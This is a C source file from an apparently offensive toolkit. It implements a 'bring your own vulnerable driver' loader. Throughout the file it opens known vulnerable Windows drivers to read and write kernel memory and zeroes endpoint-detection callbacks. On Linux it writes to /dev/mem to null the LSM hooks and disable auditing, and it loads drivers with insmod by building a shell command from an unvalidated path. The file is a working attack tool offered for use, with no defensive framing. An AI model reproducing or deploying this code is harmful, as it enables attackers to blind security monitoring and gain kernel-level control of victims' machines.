/* ============================================================================
 * Jockey's Execution Engine -- byovd_loader.c
 * Bring Your Own Vulnerable Driver loader with kernel memory R/W.
 * Windows: RTCore64, Capcom, DBUtil, GIO, AsrDrv drivers.
 * Linux: /dev/mem fallback with pread/pwrite.
 * FIXED: Linux recursive call bug. Added NT_SUCCESS macro.
 * ============================================================================ */

#include "../include/byovd.h"
#include "../include/pal.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32

#include <windows.h>
#include <winioctl.h>
#include <setupapi.h>
#include <devguid.h>
#include <winternl.h>

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

static HANDLE g_hDriver = INVALID_HANDLE_VALUE;
static char   g_serviceName[MAX_PATH] = {0};

/* ------------------------------------------------------------------ */
static BOOL open_vulnerable_driver(void) {
    if (g_hDriver != INVALID_HANDLE_VALUE) return TRUE;
    const char* devices[] = {
        "\\\\.\\RTCore64",
        "\\\\.\\Capcom",
        "\\\\.\\DBUtil",
        "\\\\.\\GIO",
        "\\\\.\\AsrDrv106",
        NULL
    };
    for (int i = 0; devices[i]; i++) {
        g_hDriver = CreateFileA(devices[i], GENERIC_READ | GENERIC_WRITE,
                                FILE_SHARE_READ | FILE_SHARE_WRITE,
                                NULL, OPEN_EXISTING, 0, NULL);
        if (g_hDriver != INVALID_HANDLE_VALUE) {
            LOG_INFO("[*] Opened vulnerable driver: %s\n", devices[i]);
            return TRUE;
        }
    }
    return FALSE;
}

/* ------------------------------------------------------------------ */
static BOOL driver_ioctl(DWORD code, LPVOID inBuf, DWORD inSize,
                         LPVOID outBuf, DWORD outSize, LPDWORD bytesReturned) {
    if (!open_vulnerable_driver()) return FALSE;
    DWORD br = 0;
    if (!bytesReturned) bytesReturned = &br;
    return DeviceIoControl(g_hDriver, code, inBuf, inSize, outBuf, outSize, bytesReturned, NULL);
}

/* ------------------------------------------------------------------ */
static BOOL read_kernel_memory_ioctl(uintptr_t address, void* buffer, size_t size) {
    typedef struct { DWORD_PTR Address; DWORD_PTR Value; DWORD Size; } MSI_READ;
    MSI_READ req = { address, (DWORD_PTR)buffer, (DWORD)size };
    return driver_ioctl(0x80872007, &req, sizeof(req), NULL, 0, NULL);
}

/* ------------------------------------------------------------------ */
static BOOL write_kernel_memory_ioctl(uintptr_t address, const void* buffer, size_t size) {
    typedef struct { DWORD_PTR Address; DWORD_PTR Value; DWORD Size; } MSI_WRITE;
    MSI_WRITE req = { address, (DWORD_PTR)buffer, (DWORD)size };
    return driver_ioctl(0x80872008, &req, sizeof(req), NULL, 0, NULL);
}

/* ------------------------------------------------------------------ */
static DWORD get_windows_build(void) {
    RTL_OSVERSIONINFOW osvi;
    ZeroMemory(&osvi, sizeof(osvi));
    osvi.dwOSVersionInfoSize = sizeof(osvi);

    typedef LONG (WINAPI *RtlGetVersion_t)(PRTL_OSVERSIONINFOW);
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return 0;

    union {
        FARPROC proc;
        RtlGetVersion_t fn;
    } rtlGetVersion = { .proc = GetProcAddress(hNtdll, "RtlGetVersion") };
    if (!rtlGetVersion.proc) return 0;

    if (rtlGetVersion.fn(&osvi) == 0) return osvi.dwBuildNumber;
    return 0;
}

/* ------------------------------------------------------------------ */
static uintptr_t get_kernel_base(void) {
    typedef struct _SYSTEM_MODULE_ENTRY {
        HANDLE Section;
        PVOID MappedBase;
        PVOID ImageBase;
        ULONG ImageSize;
        ULONG Flags;
        USHORT LoadOrderIndex;
        USHORT InitOrderIndex;
        USHORT LoadCount;
        USHORT OffsetToFileName;
        UCHAR FullPathName[256];
    } SYSTEM_MODULE_ENTRY;

    typedef struct _SYSTEM_MODULE_INFORMATION {
        ULONG Count;
        SYSTEM_MODULE_ENTRY Module[1];
    } SYSTEM_MODULE_INFORMATION;

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;

    typedef NTSTATUS (NTAPI *NtQuerySystemInformation_t)(ULONG, PVOID, ULONG, PULONG);
    union {
        FARPROC proc;
        NtQuerySystemInformation_t fn;
    } ntQuerySystemInformation = { .proc = GetProcAddress(ntdll, "NtQuerySystemInformation") };
    if (!ntQuerySystemInformation.proc) return 0;

    ULONG bufferSize = 0;
    ntQuerySystemInformation.fn(11, NULL, 0, &bufferSize);
    if (!bufferSize) return 0;

    SYSTEM_MODULE_INFORMATION* pInfo = (SYSTEM_MODULE_INFORMATION*)malloc(bufferSize);
    if (!pInfo) return 0;

    NTSTATUS status = ntQuerySystemInformation.fn(11, pInfo, bufferSize, &bufferSize);
    if (!NT_SUCCESS(status)) { free(pInfo); return 0; }

    for (ULONG i = 0; i < pInfo->Count; i++) {
        char* name = (char*)pInfo->Module[i].FullPathName + pInfo->Module[i].OffsetToFileName;
        if (_stricmp(name, "ntoskrnl.exe") == 0) {
            uintptr_t base = (uintptr_t)pInfo->Module[i].ImageBase;
            free(pInfo);
            return base;
        }
    }
    free(pInfo);
    return 0;
}

/* ------------------------------------------------------------------ */
int disable_edr_callbacks(void) {
    if (!open_vulnerable_driver()) {
        LOG_INFO("[!] No vulnerable driver opened -- EDR bypass impossible.\n");
        return -1;
    }

    DWORD build = get_windows_build();
    if (build == 0) {
        LOG_INFO("[!] Failed to get Windows build number.\n");
        return -1;
    }

    uintptr_t kernelBase = get_kernel_base();
    if (!kernelBase) {
        LOG_INFO("[!] Failed to get kernel base address.\n");
        return -1;
    }

    DWORD_PTR offset = 0;
    switch (build) {
        case 19045: case 19044: case 19043: case 19042: case 19041:
            offset = 0x4F0; break;
        case 18363: case 18362:
            offset = 0x4E8; break;
        case 22621: case 22631: case 22000:
            offset = 0x4F0; break;
        default:
            offset = 0x4F0; break;
    }

    uintptr_t tableAddr = kernelBase + offset;
    ULONG_PTR callbackTable[64] = {0};

    if (!read_kernel_memory_ioctl(tableAddr, callbackTable, sizeof(callbackTable))) {
        LOG_INFO("[!] Failed to read callback table at 0x%p\n", (void*)tableAddr);
        return -1;
    }

    int count = 0;
    for (int i = 0; i < 64; i++) {
        if (callbackTable[i] != 0) {
            LOG_INFO("[*] Zeroing callback %d at 0x%p\n", i, (void*)callbackTable[i]);
            callbackTable[i] = 0;
            count++;
        }
    }

    if (count == 0) {
        LOG_INFO("[*] No EDR callbacks found.\n");
        return 0;
    }

    if (!write_kernel_memory_ioctl(tableAddr, callbackTable, sizeof(callbackTable))) {
        LOG_INFO("[!] Failed to write callback table.\n");
        return -1;
    }

    LOG_INFO("[+] Disabled %d EDR callbacks.\n", count);
    return 0;
}

/* ------------------------------------------------------------------ */
int load_byovd(const char* driver_path) {
    if (!driver_path || !driver_path[0]) {
        LOG_INFO("[!] No driver path provided.\n");
        return -1;
    }
    LOG_INFO("[*] Loading vulnerable driver: %s\n", driver_path);

    char serviceName[64];
    snprintf(serviceName, sizeof(serviceName), "JockyDrv_%lu", GetCurrentProcessId());
    strncpy(g_serviceName, serviceName, sizeof(g_serviceName) - 1);
    g_serviceName[sizeof(g_serviceName) - 1] = '\0';

    SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!scm) {
        LOG_INFO("[!] Failed to open SCM: %lu\n", GetLastError());
        return -1;
    }

    SC_HANDLE svc = OpenServiceA(scm, serviceName, SERVICE_ALL_ACCESS);
    if (svc) { DeleteService(svc); CloseServiceHandle(svc); }

    svc = CreateServiceA(scm, serviceName, serviceName, SERVICE_ALL_ACCESS,
                         SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
                         SERVICE_ERROR_NORMAL, driver_path,
                         NULL, NULL, NULL, NULL, NULL);
    if (!svc) {
        LOG_INFO("[!] Failed to create service: %lu\n", GetLastError());
        CloseServiceHandle(scm);
        return -1;
    }
    LOG_INFO("[+] Created service: %s\n", serviceName);

    if (!StartServiceA(svc, 0, NULL)) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            LOG_INFO("[!] Failed to start service: %lu\n", err);
            DeleteService(svc);
            CloseServiceHandle(svc);
            CloseServiceHandle(scm);
            return -1;
        }
    }
    LOG_INFO("[+] Driver started\n");
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);

    Sleep(500);
    if (!open_vulnerable_driver()) {
        LOG_INFO("[!] Driver device not accessible -- but driver may be loaded.\n");
    }
    return 0;
}

/* ------------------------------------------------------------------ */
int unload_byovd(const char* driver_name) {
    const char* name = driver_name;
    if (!name || name[0] == '\0') {
        if (g_serviceName[0] == '\0') {
            LOG_INFO("[!] No driver name provided and no service loaded.\n");
            return -1;
        }
        name = g_serviceName;
    }
    LOG_INFO("[*] Unloading driver: %s\n", name);

    if (g_hDriver != INVALID_HANDLE_VALUE) {
        CloseHandle(g_hDriver);
        g_hDriver = INVALID_HANDLE_VALUE;
    }

    SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scm) {
        LOG_INFO("[!] Failed to open SCM: %lu\n", GetLastError());
        return -1;
    }
    SC_HANDLE svc = OpenServiceA(scm, name, SERVICE_ALL_ACCESS);
    if (!svc) {
        LOG_INFO("[!] Service not found: %lu\n", GetLastError());
        CloseServiceHandle(scm);
        return -1;
    }
    SERVICE_STATUS status;
    ControlService(svc, SERVICE_CONTROL_STOP, &status);
    DeleteService(svc);
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    LOG_INFO("[+] Driver unloaded\n");
    return 0;
}

/* ------------------------------------------------------------------ */
int read_kernel_memory(uintptr_t address, void* buffer, size_t size) {
    return read_kernel_memory_ioctl(address, buffer, size) ? 0 : -1;
}

int write_kernel_memory(uintptr_t address, const void* buffer, size_t size) {
    return write_kernel_memory_ioctl(address, buffer, size) ? 0 : -1;
}

#else /* __linux__ */

#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <sys/mman.h>
#include <elf.h>
#include <link.h>
#include <dlfcn.h>

static int g_driver_fd = -1;
static uintptr_t g_kernel_base = 0;

/* ------------------------------------------------------------------ */
static int open_vulnerable_driver(void) {
    if (g_driver_fd >= 0) return g_driver_fd;
    const char* devices[] = { "/dev/vulnerable_driver", "/dev/mem", NULL };
    for (int i = 0; devices[i]; i++) {
        int fd = open(devices[i], O_RDWR);
        if (fd >= 0) {
            g_driver_fd = fd;
            LOG_INFO("[*] Opened vulnerable driver: %s\n", devices[i]);
            return fd;
        }
    }
    return -1;
}

/* ------------------------------------------------------------------
 * INTERNAL: read kernel memory via pread (NOT exported -- avoids recursion)
 * ------------------------------------------------------------------ */
static int _read_kmem_internal(uintptr_t address, void* buffer, size_t size) {
    int fd = open_vulnerable_driver();
    if (fd < 0) return -1;
    ssize_t n = pread(fd, buffer, size, (off_t)address);
    return (n == (ssize_t)size) ? 0 : -1;
}

/* ------------------------------------------------------------------
 * INTERNAL: write kernel memory via pwrite (NOT exported)
 * ------------------------------------------------------------------ */
static int _write_kmem_internal(uintptr_t address, const void* buffer, size_t size) {
    int fd = open_vulnerable_driver();
    if (fd < 0) return -1;
    ssize_t n = pwrite(fd, buffer, size, (off_t)address);
    return (n == (ssize_t)size) ? 0 : -1;
}

/* ------------------------------------------------------------------ */
static uintptr_t get_kernel_base(void) {
    if (g_kernel_base) return g_kernel_base;

    FILE* f = fopen("/proc/iomem", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strstr(line, "Kernel code")) {
                uintptr_t start, end;
                if (sscanf(line, "%lx-%lx", &start, &end) == 2) {
                    fclose(f);
                    g_kernel_base = start;
                    return start;
                }
            }
        }
        fclose(f);
    }

    f = fopen("/proc/kallsyms", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strstr(line, "_stext") || strstr(line, "startup_64")) {
                uintptr_t addr;
                if (sscanf(line, "%lx", &addr) == 1) {
                    fclose(f);
                    g_kernel_base = addr - 0x1000000;
                    return g_kernel_base;
                }
            }
        }
        fclose(f);
    }
    return 0;
}

/* ------------------------------------------------------------------ */
static uintptr_t get_symbol_address(const char* symbol) {
    FILE* f = fopen("/proc/kallsyms", "r");
    if (!f) return 0;
    char line[256];
    while (fgets(line, sizeof(line), f)) {
        if (strstr(line, symbol)) {
            uintptr_t addr;
            if (sscanf(line, "%lx", &addr) == 1) {
                fclose(f);
                return addr;
            }
        }
    }
    fclose(f);
    return 0;
}

/* ------------------------------------------------------------------ */
int disable_edr_callbacks(void) {
    LOG_INFO("[*] Linux EDR bypass: disabling LSM and audit\n");

    if (open_vulnerable_driver() < 0) {
        LOG_INFO("[!] No vulnerable driver opened.\n");
        return -1;
    }

    uintptr_t security_ops_addr = get_symbol_address(" security_ops");
    uintptr_t audit_enabled_addr = get_symbol_address(" audit_enabled");

    if (!security_ops_addr && !audit_enabled_addr) {
        LOG_INFO("[!] Could not find security_ops or audit_enabled in /proc/kallsyms.\n");
        return -1;
    }

    if (security_ops_addr) {
        uintptr_t null_ptr = 0;
        if (_write_kmem_internal(security_ops_addr, &null_ptr, sizeof(null_ptr)) == 0) {
            LOG_INFO("[+] Disabled security_ops (LSM) at 0x%lx\n", security_ops_addr);
        } else {
            LOG_INFO("[!] Failed to write security_ops\n");
            return -1;
        }
    }

    if (audit_enabled_addr) {
        uint32_t zero = 0;
        if (_write_kmem_internal(audit_enabled_addr, &zero, sizeof(zero)) == 0) {
            LOG_INFO("[+] Disabled audit_enabled at 0x%lx\n", audit_enabled_addr);
        } else {
            LOG_INFO("[!] Failed to write audit_enabled\n");
            return -1;
        }
    }

    system("sysctl -w kernel.audit_enabled=0 2>/dev/null");
    LOG_INFO("[+] Linux EDR bypass completed.\n");
    return 0;
}

/* ------------------------------------------------------------------ */
int load_byovd(const char* driver_path) {
    if (!driver_path || !driver_path[0]) {
        LOG_INFO("[!] No driver path provided.\n");
        return -1;
    }
    LOG_INFO("[*] Loading vulnerable driver (Linux): %s\n", driver_path);
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "insmod %s", driver_path);
    int ret = system(cmd);
    if (ret == 0) {
        LOG_INFO("[+] Driver loaded\n");
        open_vulnerable_driver();
        return 0;
    } else {
        LOG_INFO("[!] Failed to load driver (insmod returned %d)\n", ret);
        return -1;
    }
}

/* ------------------------------------------------------------------ */
int unload_byovd(const char* driver_name) {
    if (!driver_name || !driver_name[0]) {
        LOG_INFO("[!] No driver name provided.\n");
        return -1;
    }
    LOG_INFO("[*] Unloading driver (Linux): %s\n", driver_name);
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "rmmod %s", driver_name);
    int ret = system(cmd);
    if (ret == 0) {
        LOG_INFO("[+] Driver unloaded\n");
        if (g_driver_fd >= 0) { close(g_driver_fd); g_driver_fd = -1; }
        return 0;
    } else {
        LOG_INFO("[!] Failed to unload driver (rmmod returned %d)\n", ret);
        return -1;
    }
}

/* ------------------------------------------------------------------
 * EXPORTED kernel memory functions (wrapper around internal statics)
 * ------------------------------------------------------------------ */
int read_kernel_memory(uintptr_t address, void* buffer, size_t size) {
    return _read_kmem_internal(address, buffer, size);
}

int write_kernel_memory(uintptr_t address, const void* buffer, size_t size) {
    return _write_kmem_internal(address, buffer, size);
}

#endif /* __linux__ */
